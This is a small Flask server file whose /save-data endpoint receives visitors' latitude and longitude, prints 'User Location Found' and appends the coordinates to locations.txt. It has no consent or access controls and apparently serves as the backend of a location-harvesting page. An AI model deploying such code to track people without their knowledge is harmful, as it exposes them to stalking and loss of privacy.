from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    
    log = f"Latitude: {lat}, Longitude: {lon}\n"
    print(f"User Location Found: {log}")
    
    # Ek file mein save kar lega
    with open("locations.txt", "a") as f:
        f.write(log)
        
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)